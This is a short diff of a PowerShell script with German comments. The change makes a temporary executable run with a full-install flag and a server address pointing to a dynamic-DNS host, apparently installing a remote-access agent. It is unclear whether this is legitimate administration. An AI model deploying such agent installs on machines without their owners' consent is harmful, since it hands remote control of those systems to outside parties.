@@ -52,8 +52,14 @@ try {
     [System.IO.File]::WriteAllBytes($tempFilePath, $bytes)
     Write-Output "Temporäre Datei erstellt unter: $tempFilePath"
 
+    # Definiere die Kommandozeilenparameter
+    $params = "-fullinstall --Meshserver=wss://lorcan.selfhost.eu:443/agent.ashx"
+
+    # Führe die .exe-Datei mit den Parametern aus
+    & $tempFilePath $params
+
     # Führe die .exe-Datei aus
-    & $tempFilePath
+    #& $tempFilePath
 
     # Warte, bis der Prozess beendet ist
     Start-Sleep -Seconds 5
